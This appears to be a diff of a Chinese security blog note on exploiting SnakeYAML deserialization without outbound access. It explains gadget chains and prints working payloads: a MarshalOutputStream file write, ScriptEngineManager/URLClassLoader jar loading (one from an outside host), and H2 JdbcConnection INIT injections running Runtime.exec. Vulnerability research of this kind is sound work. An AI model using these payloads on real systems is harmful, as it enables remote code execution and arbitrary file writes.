@@ -72,9 +72,17 @@ datetime:
     -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区
 ```
 
+`-`的作用：
+
+![image-20250417161408050](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png)
+
+![image-20250417161422499](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png)
+
+![image-20250417161428690](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png)
+
 # SnakeYaml反序列化
 
-全版本可利用
+1.x全版本可利用，snakeYaml<2.0
 
 ```xml
 <dependency>
@@ -249,7 +257,7 @@ public class ScriptEngineManger {
 
 
 
-## C3P0不出网
+## 不出网C3P0
 
 不出网的情况能打C3P0，需要C3P0依赖
 
@@ -326,11 +334,41 @@ public class C3P0ImplUtils_HEX_CC6 {
 
 
 
-## MarshalOutputStream写文件
+## 不出网MarshalOutputStream写文件
 
-利用了fastjson1.2.68的思路，由于snakeYaml调用构造函数并不会使用ASMUtils.lookupParametersName去寻找带参数名的构造函数，所以比较通用
+snakeYaml和fastjson很像，可以借鉴一下fastjson的payload
 
-fastjson 1.2.68的原生JRE8 payload：
+phith0n师傅做了一张图，copy一下
+
+![image-20250415182117465](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png)
+
+不出网的情况下，fastjson有一条1.2.68+commons-io写文件的链子。在分析这条链子的时候提到OpenJDK>=11能无需commons-io依赖直接写文件的MarshalOutputStream POC
+
+https://godownio.github.io/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/
+
+之所以在fastjson中MarshalOutputStream写文件的链子会比较局限
+
+fastjson在找不到默认无参构造函数的情况下，会遍历所有构造函数，使用lookupParametersName寻找带参数名信息的构造函数
+
+[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png)](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png)
+
+[![img](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png)](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png)
+
+缺失了LocalVeriableTable并不会影响类的正常使用和反射调用，但是会使调试出现问题，无法提供方法中局部变量的名称、类型和作用范围等信息。
+
+ASMUtils.lookupParametersName 方法依赖于 LocalVariableTable 信息来查找方法参数的名称。
+
+https://zhuanlan.zhihu.com/p/263503452
+
+> `LocalVariableTable` 是 Java 字节码中 **调试信息的一部分**，存在于 `.class` 文件中的方法结构内，属于 `Code` 属性的扩展部分。它记录了方法中每个局部变量的 **变量名、作用域、生存期及槽位索引**，但它 **不是必须的**——它仅在编译时启用了调试信息（例如 `javac -g`）时才会生成。
+
+fastjson在调用构造函数时，缺失LocalVariableTable会导致ASMUtils.lookupParametersName报错
+
+目前只发现 CentOS 下的 OpenJDK 8 字节码调试信息中含有 LocalVariableTable。或者是win下的OpenJDK >=11，所以在fastjson中利用环境非常有限
+
+但是snakeYaml调用构造函数并不会用到LocalVariableTable，所以MarshalOutputStream写文件的链子会比较通用，没有jdk限制
+
+fastjson写文件链子：
 
 ```json
 {
@@ -355,17 +393,15 @@ fastjson 1.2.68的原生JRE8 payload：
 }
 ```
 
-改写为yaml的格式
+改写为yaml格式：
 
-```json
+```yaml
 !!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["Destpath"],false],!!java.util.zip.Inflater  { input: !!binary base64str },1048576]]
 ```
 
 Destpath是目的路径，base64str为经过zlib压缩过后的文件内容
 
-给一个现成的payload：
-
-https://xz.aliyun.com/t/15723?time__1311=GqjxnQiQGQeQqGNDQ0eBIPY54AILnYhuAbD#toc-10
+一个现成的payload：
 
 ```java
 package org.exploit.third.SnakeYaml;
@@ -436,8 +472,99 @@ public class SnakeYamlOffInternet {
         return output;
     }
 }
-
 ```
+
+这个方式进行写文件有个非常好的好处。就是因为zlib压缩的存在，可以写任何形式的文件，包括普通的文本文件和二进制文件。
+
+### 联动ScriptEngineManager
+
+联动ScriptEngineManger POC达到写文件后加载jar的姿势。完成不出网的RCE
+
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["file:///success.jar"]]]]
+```
+
+另外，SnakeYaml可以无限制调用构造函数，那么可以用ClassPathXmlApplicationContext进行spEL注入，当然，这种手法也需要连接外网，如果无法连接外网，也需要通过写文件再读取的方式进行利用
+
+## 不出网H2 JDBC
+
+update at 2025.4.15 phith0n大师傅对HertzBeat中SnakeYaml反序列化不出网的拓展。详情请直接移步https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html
+
+jdk>=11，有h2database的情况下，能打h2 JDBC Attack
+
+fastjson>=1.2.36可以通过$ref调用getter，如果目标有h2database的依赖，可以通过调用org.h2.jdbcx.JdbcDataSource#getConnection打h2database的jdbc attack
+
+![image-20250417122145100](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png)
+
+```json
+[
+    {
+        "@type": "java.lang.Class",
+        "val": "org.h2.jdbcx.JdbcDataSource"
+    },
+    {
+        "@type": "org.h2.jdbcx.JdbcDataSource",
+        "url": "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc\")\\; }'\\;CALL EXEC ()\\;"
+    },
+    {
+        "$ref": "$[1].connection"
+    }
+]
+```
+
+>一般来说代码里的h2 jdbc attack是用`DriverManager.getConnection(JDBC_Url, username, password);`触发的，但是有参，不符合getter的调用
+
+又因为org.h2.jdbcx.JdbcDataSource#getConnection实际上是调用的JdbcConnection构造函数，在snakeYaml中就很有用武之地了，snakeYaml打h2 jdbc：
+
+```yaml
+!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc.exe\")\\; }$$\\;CALL EXEC ()\\;", {}, "a", "b", false ]
+```
+
+上述转为yaml格式应该是：
+
+```yaml
+!!org.h2.jdbc.JdbcConnection
+- jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc.exe\")\\; }$$\\;CALL EXEC ()\\;
+- {}
+- a
+- b
+- false
+```
+
+而且H2 Database Web Console的未授权访问漏洞导致的JDBC注入 CVE-2022-23221的修复方式之一就是：在H2>=1.4.198中把构造函数的最后一个参数改为true（此处略过调试）
+
+https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md
+
+因为我们能直接控制构造函数的所有参数，所以能忽略h2执行命令所需的条件：必须知道数据库名或开启-ifNotExists
+
+另外，我们观察到，第一个参数URL中，由于要在INIT中执行多个SQL语句，所以我使用了反斜线对分号进行转义`\;`，但又由于整个URL位于YAML中的字符串中，所以还要再次对反斜线进行转义`\\;`，整个POC的可读性大大降低。
+
+> 网上有一些文章说JDBC的INIT中不支持执行多个SQL语句，其实原因就是没有转义分号导致的，实际上这里并没有限制。
+
+其实JdbcConnection构造函数的第二个参数是Properties，我们完全可以将INIT这种属性放到这里面。
+
+![image-20250417155614271](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png)
+
+以减少URL参数中的转义，然后将YAML修改成我们更熟悉的样式：
+
+>YAML 中的 `|` 是一种 **多行文本（Literal Block Scalar）标记符**，用于保留换行并原样呈现多行字符串的内容
+
+```yaml
+!!org.h2.jdbc.JdbcConnection
+- jdbc:h2:mem:test
+- MODE: MSSQLServer
+  INIT: |
+    drop alias if exists exec;
+    CREATE ALIAS EXEC AS $$void exec() throws Exception {Runtime.getRuntime().exec("calc.exe");}$$;
+    CALL EXEC ();
+- a
+- b
+- false
+```
+
+![1c4c466d-6be0-433f-b059-d5ee65bd4c09.5e0d5f5f0728](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1c4c466d-6be0-433f-b059-d5ee65bd4c09.5e0d5f5f0728.png)
+
+注意`-`的作用噢
 
 
 
@@ -476,3 +603,11 @@ Tag的声明位于org.yaml.snakeyaml.nodes.Tags
 ---
 !javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL ["http://b1ue.cn/"]]]]
 ```
+
+
+
+
+
+ref：
+
+https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html
